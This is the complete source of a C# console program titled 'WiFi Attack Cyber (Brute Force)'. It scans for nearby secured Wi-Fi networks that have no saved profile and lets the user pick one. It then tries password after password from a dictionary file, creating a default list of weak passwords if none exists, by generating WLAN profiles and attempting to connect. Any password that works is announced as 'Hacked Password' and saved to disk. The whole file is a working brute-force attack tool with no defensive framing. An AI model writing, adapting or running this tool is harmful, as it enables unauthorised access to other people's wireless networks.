using NativeWifi;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace Hack.WBF
{
    class Program
    {
        public static string TempProfile = "";
        public static int Interval = 1000;
        public static WlanClient.WlanInterface Interface;
        public static Wlan.WlanAvailableNetwork[] AvNetwork;
        public static string PasswordDictionaryPath = "pwd.txt";
        public static string OutputFileName = "";
        public static WlanClient client = new WlanClient();
        
        static void Main(string[] args)
        {
            Console.Title = "WiFi Attack Cyber (Brute Force)";

            if(client.Interfaces.Length <= 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error: No WLAN interfaces");
                return;
            }

            if (args.Length == 0)
            {
                SetInterface();
                AloneCrack();
            }
        }

        static void SetInterface()
        {
            while (true)
            {
                if (client.Interfaces.Length == 1)
                {
                    Interface = client.Interfaces[0];
                    Console.WriteLine("Interface [0] " + Interface.InterfaceName + " selected");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                }

                GetInterface();
                Console.Write("Type ID to select : ");
                string result = Console.ReadLine();
                if (result.Length != 0)
                {
                    Interface = client.Interfaces[int.Parse(result)];
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine(String.Format("Interface [{0}] {1} selected", int.Parse(result), Interface.InterfaceName));
                    Console.ForegroundColor = ConsoleColor.Gray;
                    break;
                }

            }
        }

        static void GetInterface()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\r\nAvailable interfaces:");
            
            for(int i = 0; i < client.Interfaces.Length; i++)
            {
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write("[" + i + "] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine(client.Interfaces[i].InterfaceName);
                Console.ForegroundColor = ConsoleColor.Gray;
            }

        }

        static void AloneCrack()
        {
            while (true)
            {
                CrackWiFiList();
                Console.Write("Type ID to hack : ");
                string result = Console.ReadLine();
                if(result.Length != 0)
                {
                    if (result.StartsWith("i")) SetInterface();
                    else
                    {
                        try
                        {
                            Console.WriteLine();
                            StartBruteforcing(AvNetwork[int.Parse(result)], GetPasswordList());

                        }
                        catch (Exception ex)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("Error:\r\n" + ex.ToString());
                        }
                    }
                }
            }
        }

        public static void LineClear()
        {
            int symbols = Console.CursorLeft;
            Console.SetCursorPosition(0, Console.CursorTop);
            for(int i = 0; i < symbols; i++) Console.Write(' ');
            Console.SetCursorPosition(0, Console.CursorTop);
        }

        public static List<string> GetPasswordList()
        {
            if (!File.Exists("pwd.txt"))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error: No pwd.txt...");
                Console.ForegroundColor = ConsoleColor.Gray;
                using (StreamWriter w = new StreamWriter("pwd.txt"))
                {
                    w.WriteLine("00000000");
                    w.WriteLine("12345678");
                    w.WriteLine("xxxxxxxx");
                    w.WriteLine("00000");
                    w.WriteLine("33333");
                    w.WriteLine("11111111");
                    w.WriteLine("11111");
                    w.WriteLine("xxxxx");
                    w.WriteLine("77777");
                    w.WriteLine("12345");
                    w.WriteLine("54321");
                    w.WriteLine("aaaaaaaa");
                    w.WriteLine("123456");
                    w.WriteLine("013579");
                    w.WriteLine("0246810");
                    w.WriteLine("12571113");
                    w.WriteLine("abcdefgh");
                    w.WriteLine("password");
                    w.WriteLine("1111111111111");
                }

                //return;
            }
            List<string> pwdList = new List<string>();
            string all = "";
            using (StreamReader r = new StreamReader("pwd.txt"))
            {
                all = r.ReadToEnd();
            }
            LineClear();
            pwdList = all.Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries).ToList<string>();
            LineClear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write(" = " + (pwdList.Count) + " passwords loaded\r\n");
            return pwdList;
        }

        public static string StringToHex(string s)
        {
            byte[] ba = Encoding.Default.GetBytes(s);
            var hexString = BitConverter.ToString(ba);
            hexString = hexString.Replace("-", "");
            return hexString;
        }

        public static string GenerateXmlWLAN(Wlan.WlanAvailableNetwork network, string key)
        {
            return GenerateXmlWLAN(GetStringForSSID(network.dot11Ssid), key, network.dot11DefaultAuthAlgorithm, network.dot11DefaultCipherAlgorithm);
        }

        public static string GenerateXmlWLAN(string profileName, string key, Wlan.Dot11AuthAlgorithm auth, Wlan.Dot11CipherAlgorithm cipher)
        {
            string mac = StringToHex(profileName);
            string result = "";

            if (cipher == Wlan.Dot11CipherAlgorithm.WEP)
                result = string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><hex>{1}</hex><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption>{2}<useOneX>false</useOneX></authEncryption><sharedKey><keyType>networkKey</keyType><protected>false</protected><keyMaterial>{3}</keyMaterial></sharedKey><keyIndex>0</keyIndex></security></MSM></WLANProfile>", profileName, mac, GetAuthInfo(auth, cipher), key);

            else
                result = string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><hex>{1}</hex><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption>{2}<useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{3}</keyMaterial></sharedKey><keyIndex>0</keyIndex></security></MSM></WLANProfile>", profileName, mac, GetAuthInfo(auth, cipher), key);

            return result;
        }

        public static string GetAuthInfo(Wlan.Dot11AuthAlgorithm auth, Wlan.Dot11CipherAlgorithm cipher)
        {
            string a = "";
            string e = "";
            if (auth == Wlan.Dot11AuthAlgorithm.IEEE80211_Open) { a = "open"; }
            else if (auth == Wlan.Dot11AuthAlgorithm.RSNA_PSK) { a = "WPA2PSK"; }
            else if (auth == Wlan.Dot11AuthAlgorithm.WPA_PSK) { a = "WPAPSK"; }

            if (cipher == Wlan.Dot11CipherAlgorithm.WEP) e = "WEP";
            else if (cipher == Wlan.Dot11CipherAlgorithm.CCMP) e = "AES";

            return "<authentication>" + a + "</authentication><encryption>" + e + "</encryption>";
        }

        public static string GetTimeLeft(int total, int current, int i)
        {
            DateTime now = DateTime.Now;
            int addms = (total - current) * i;
            now = now.AddMilliseconds(addms);
            TimeSpan result = (now - DateTime.Now);
            return result.ToString();
        }

        public static void StartBruteforcing(Wlan.WlanAvailableNetwork network, List<string> passwordDictionary)
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            if (network.dot11DefaultCipherAlgorithm == Wlan.Dot11CipherAlgorithm.WEP)
            {
                Interval = 5000;
            }
            else
            {
                Interval = 2000;
            }

            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(" = Start " + DateTime.Now.ToString());
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine(" = " + GetStringForSSID(network.dot11Ssid) + "\r\n");

            string profileName = GetStringForSSID(network.dot11Ssid); // this is also the SSID

            string mac = StringToHex(profileName);
           
            for (int i = 0; i < passwordDictionary.Count; i++)
            {

                LineClear();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.Write(String.Format("[{0}/{1}] ", (i+1), passwordDictionary.Count));
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(passwordDictionary[i]);
                Console.ForegroundColor = ConsoleColor.DarkGray;
                //if(passwordDictionary.Count >= 10) Console.Write(" time left: " + GetTimeLeft(passwordDictionary.Count, i, Interval));

                string key = passwordDictionary[i];
                if(network.dot11DefaultCipherAlgorithm == Wlan.Dot11CipherAlgorithm.WEP)
                {
                    if (key.Length != 5 && key.Length != 13) continue;
                }
                else
                {
                    if (key.Length < 8) continue;
                }
                string profileXml = GenerateXmlWLAN(network, key);

                Interface.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);
                Interface.Connect(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, profileName);
                Thread.Sleep(Interval);

                if (Interface.CurrentConnection.isState != Wlan.WlanInterfaceState.Connected
                    || Interface.CurrentConnection.isState == Wlan.WlanInterfaceState.Authenticating
                    || Interface.CurrentConnection.isState == Wlan.WlanInterfaceState.Associating)
                    continue;
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("\r\n\r\n = Hacked Password : ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(passwordDictionary[i]);
                    using (StreamWriter w = new StreamWriter(profileName + ".txt"))
                    {
                        w.WriteLine(passwordDictionary[i]);
                    }
                    break;
                }

            }
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("\r\n\r\n = Done " + DateTime.Now.ToString());
            Console.ReadKey();
        }

        static string GetStringForSSID(Wlan.Dot11Ssid ssid)
        {
            return Encoding.ASCII.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);
        }

        static void CrackWiFiList()
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("Available networks:");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.Write("Scanning");
            Interface.Scan();
            
            Thread.Sleep(500);
            Console.Write(".");
            Thread.Sleep(500);
            Console.Write(".");
            Thread.Sleep(500);
            Console.Write(".");
            Thread.Sleep(500);
            Console.SetCursorPosition(0, Console.CursorTop);
            Console.Write("                 ");
            Console.SetCursorPosition(0, Console.CursorTop);

            AvNetwork = Interface.GetAvailableNetworkList(Wlan.WlanGetAvailableNetworkFlags.IncludeAllManualHiddenProfiles);
            for (int i = 0; i < AvNetwork.Length; i++)
            {
                var network = AvNetwork[i];

                if (network.profileName.Length <= 0 && network.securityEnabled)
                {

                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.Write("[" + i);

                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.Write("] ");

                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(GetStringForSSID(network.dot11Ssid));

                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.Write(" " + network.dot11DefaultCipherAlgorithm.ToString() + " " + network.dot11DefaultAuthAlgorithm.ToString() + " ");
                    Console.Write("signal: " + network.wlanSignalQuality);
                    Console.WriteLine();
                }
            }
            Console.ForegroundColor = ConsoleColor.Gray ;

        }
    }
}